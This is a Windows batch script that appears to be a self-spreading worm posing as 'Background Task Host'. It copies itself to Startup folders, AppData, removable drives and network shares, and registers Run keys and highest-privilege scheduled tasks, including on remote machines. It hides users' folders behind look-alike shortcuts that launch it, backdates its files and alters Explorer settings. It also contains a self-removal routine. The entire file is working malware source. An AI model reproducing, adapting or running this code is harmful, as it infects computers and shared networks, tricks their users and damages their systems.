@echo off
chcp 65001>nul

%~d0
cd "%~dp0"

setlocal EnableDelayedExpansion





set parameters=%*
set counter=0
for %%i in (%parameters%) do (
  set /a counter+=1
  if !counter! GEQ 2 set parameters2=!parameters2!%%i
)
set key_target=%parameters2:*--key_target=%

if "!key_target!" NEQ "*--key_target=" start "" explorer !key_target!



for /f "skip=4 delims= " %%i in ('tasklist /fi "imagename eq %~nx0"') do if "%%i" == "%~nx0" for /f "skip=4 delims= " %%i in ('tasklist /fi "imagename eq cmd.exe"') do if "%%i" == "cmd.exe" exit





set app_name=Background Task Host
set app_date=09-11-2001

set module_fileTouch=modules\fileTouch.exe /w /a /c /d %app_date%
set module_shortcut=modules\shortcut.exe
set module_wget=modules\wget.exe

set autoRun=call :autoRun

set path_startMenu1=%programData%\Microsoft\Windows\Start Menu\Programs
set path_startMenu2=%appData%\Microsoft\Windows\Start Menu\Programs
set path_autoRun1=%path_startMenu1%\Startup
set path_autoRun2=%path_startMenu2%\Startup



set path_desktop=%userProfile%\Desktop
if not exist "%path_desktop%" (for /f "skip=2 tokens=2,* delims= " %%i in ('reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders" /v Desktop') do call set path_desktop=%%j)>nul 2>nul

set extensions=
if not exist extensions ( md extensions
) else for /f "delims=" %%i in ('dir /a:d /b extensions 2^>nul') do if exist extensions\%%i\config.ini set extensions=!extensions!%%i;



%module_fileTouch% "%~f0" >nul















:cycle
if exist "%path_desktop%\%app_date%" goto :remover

reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced"    /v Hidden /t REG_DWORD /d 2 /f >nul
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Icons" /v 29     /t REG_SZ    /d "%windir%\System32\shell32.dll,-50" /f >nul





if not exist "%path_autoRun1%\%~nx0" (
  copy /y "%~f0" "%path_autoRun1%\"
  %module_fileTouch% "%path_autoRun1%\%~nx0" >nul
)

if not exist "%path_autoRun2%\%~nx0" (
  copy /y "%~f0" "%path_autoRun2%\"
  %module_fileTouch% "%path_autoRun2%\%~nx0" >nul
)





for %%i in (localAppData appData) do (
  if not exist "!%%i!\%~nx0" call copy /y "%~f0" "!%%i!\"
  call %module_fileTouch% "!%%i!\%~nx0" >nul
  %autoRun% add %%i "!%%i!\%~nx0"
)





for %%i in (A B C D E F G H J L P Q S U V W X Y Z M I K R O N T) do if exist "%%i:\" if /i "%%i:" NEQ "%systemDrive%" if /i "%%i:" NEQ "D:" (
  for /f "delims=" %%j in ('dir "%%i:\*" /a:d /b 2^>nul') do (
    if /i "%%j" == "System Volume Information" (
      if not exist "%%i:\%%j\%~nx0" copy /y "%~f0" "%%i:\%%j\"
      attrib +h +s "%%i:\%%j"
      %module_fileTouch% "%%i:\%%j\%~nx0" >nul
      %autoRun% add %%i "%%i:\%%j\%~nx0"
    )

    if /i "%%j" NEQ "$RECYCLE.BIN" if /i "%%j" NEQ "FOUND.000" if /i "%%j" NEQ "Recycled" if /i "%%j" NEQ "System Volume Information" (
      attrib +h +s "%%i:\%%j"
      %module_fileTouch% "%%i:\%%j" >nul

      if not exist "%%i:\%%j.lnk" (
        set counter=0
        for /f "delims=" %%y in ('dir "%%i:\%%j\*" /b 2^>nul') do set /a counter+=1
        if "!counter!" == "0" ( set icon=%WinDir%\System32\shell32.dll,3
        ) else set icon=%WinDir%\System32\imageres.dll,153
        if exist "%%i:\%%j\desktop.ini" for /f "tokens=1,2 delims==" %%d in ('type "%%i:\%%j\desktop.ini"') do if /i "%%d" == "IconResource" set icon=%%e
        %module_shortcut% /a:c /f:"%%i:\%%j.lnk" /t:"%%i:\System Volume Information\%~nx0" /p:"--key_target="""%%i:\%%j"""" /i:"!icon!"
        %module_fileTouch% "%%i:\%%j.lnk" >nul
      )
    )
  )
) else (
  for /f "delims=" %%j in ('dir "%%i:\*" /a:d /b 2^>nul') do (
    if /i "%%j" NEQ "$RECYCLE.BIN" if /i "%%j" NEQ "FOUND.000" if /i "%%j" NEQ "Recycled" if /i "%%j" NEQ "System Volume Information" (
      attrib -h -s "%%i:\%%j"
      if exist "%%i:\%%j.lnk" del /q "%%i:\%%j.lnk"
    )
  )
)

timeout /nobreak /t 5 >nul





for /f "skip=3 tokens=1,* delims= " %%h in ('net view 2^>nul') do if /i "%%h" NEQ "The" (
  for /f "skip=7 tokens=1,* delims= " %%i in ('net view %%h 2^>nul') do if /i "%%i" NEQ "The" (
    for /f "delims=" %%j in ('dir "%%h\%%i\*" /a:d /b 2^>nul') do (
      if /i "%%j" == "System Volume Information" (
        if not exist "%%h\%%i\%%j\%~nx0" copy /y "%~f0" "%%h\%%i\%%j\"
        attrib +h +s "%%h\%%i\%%j"
        %module_fileTouch% "%%h\%%i\%%j\%~nx0" >nul
        %autoRun% add %%i "%%i:\%%j\%~nx0" %%h
      )
  
      if /i "%%j" NEQ "$RECYCLE.BIN" if /i "%%j" NEQ "FOUND.000" if /i "%%j" NEQ "Recycled" if /i "%%j" NEQ "System Volume Information" (
        attrib +h +s "%%h\%%i\%%j"
        %module_fileTouch% "%%h\%%i\%%j" >nul

        if not exist "%%h\%%i\%%j.lnk" (
          set counter=0
          for /f "delims=" %%y in ('dir "%%h\%%i\%%j\*" /b 2^>nul') do set /a counter+=1
          if "!counter!" == "0" ( set icon=%WinDir%\System32\shell32.dll,3
          ) else set icon=%WinDir%\System32\imageres.dll,153
          if exist "%%h\%%i\%%j\desktop.ini" for /f "tokens=1,2 delims==" %%d in ('type "%%h\%%i\%%j\desktop.ini"') do if /i "%%d" == "IconResource" set icon=%%e
          %module_shortcut% /a:c /f:"%%h\%%i\%%j.lnk" /t:"%%h\%%i\System Volume Information\%~nx0" /p:"--key_target="""%%i:\%%j"""" /i:"!icon!"
          %module_fileTouch% "%%h\%%i\%%j.lnk" >nul
        )
      )
    )
  )
)

timeout /nobreak /t 5 >nul
goto :cycle















:remover
reg delete "HKLM\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Icons" /v 29 /f >nul

if exist "%path_autoRun1%\%~nx0" del /q "%path_autoRun1%\%~nx0"
if exist "%path_autoRun2%\%~nx0" del /q "%path_autoRun2%\%~nx0"





for %%i in (localAppData appData) do (
  call del /q "!%%i!\%~nx0"
  %autoRun% delete %%i
)





for %%i in (A B C D E F G H J L P Q S U V W X Y Z M I K R O N T) do if exist "%%i:\" if /i "%%i:" NEQ "%systemDrive%" (
  for /f "delims=" %%j in ('dir "%%i:\*" /a:d /b 2^>nul') do (
    if /i "%%j" == "System Volume Information" if exist "%%i:\%%j\%~nx0" (
      del /q "%%i:\%%j\%~nx0"
      %autoRun% delete %%i
    )

    if /i "%%j" NEQ "$RECYCLE.BIN" if /i "%%j" NEQ "FOUND.000" if /i "%%j" NEQ "Recycled" if /i "%%j" NEQ "System Volume Information" (
      attrib -h -s "%%i:\%%j"
      if exist "%%i:\%%j.lnk" del /q "%%i:\%%j.lnk"
    )
  )
)





for /f "skip=3 tokens=1,* delims= " %%h in ('net view 2^>nul') do if /i "%%h" NEQ "The" (
  for /f "skip=7 tokens=1,* delims= " %%i in ('net view %%h 2^>nul') do if /i "%%i" NEQ "The" (
    for /f "delims=" %%j in ('dir "%%h\%%i\*" /a:d /b 2^>nul') do (
      if /i "%%j" == "System Volume Information" if exist "%%h\%%i\%%j\%~nx0" (
        del /q "%%h\%%i\%%j\%~nx0"
        %autoRun% delete %%i %%h
      )

      if /i "%%j" NEQ "$RECYCLE.BIN" if /i "%%j" NEQ "FOUND.000" if /i "%%j" NEQ "Recycled" if /i "%%j" NEQ "System Volume Information" (
        attrib -h -s "%%h\%%i\%%j"
        if exist "%%h\%%i\%%j.lnk" del /q "%%h\%%i\%%j.lnk"
      )
    )
  )
)





start /min "" cmd /c "timeout /t 3 && del /q """%~f0""""
exit















:autoRun
set option3=%3
if "!option3!" NEQ "" set "option3=!option3:"=!"

set option4=%4
if "!option4!" NEQ "" set "option4=!option4:"=!"



(
  if "%1" == "add" (
    reg add %option4%HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run             /v "%app_name% %2" /d "%option3%" /f
    reg add %option4%HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run             /v "%app_name% %2" /d "%option3%" /f
    reg add %option4%HKLM\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Run /v "%app_name% %2" /d "%option3%" /f

    if "%option4%" == " " ( schtasks /create /sc onstart /tn "%app_name% %2" /tr "%option3%" /f /rl highest
    ) else for /f "delims=\" %%z in ("%option4%") do schtasks /create /s %%z /sc onstart /tn "%app_name% %2" /tr "%option3%" /f /rl highest
  ) else (
    reg delete %option3%HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run             /v "%app_name% %2" /f
    reg delete %option3%HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run             /v "%app_name% %2" /f
    reg delete %option3%HKLM\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Run /v "%app_name% %2" /f

    if "%option3%" == " " ( schtasks /delete /tn "%app_name% %2" /f
    ) else for /f "delims=\" %%z in ("%option3%") do schtasks /delete /s %%z /tn "%app_name% %2" /f
  )
)>nul 2>nul
exit /b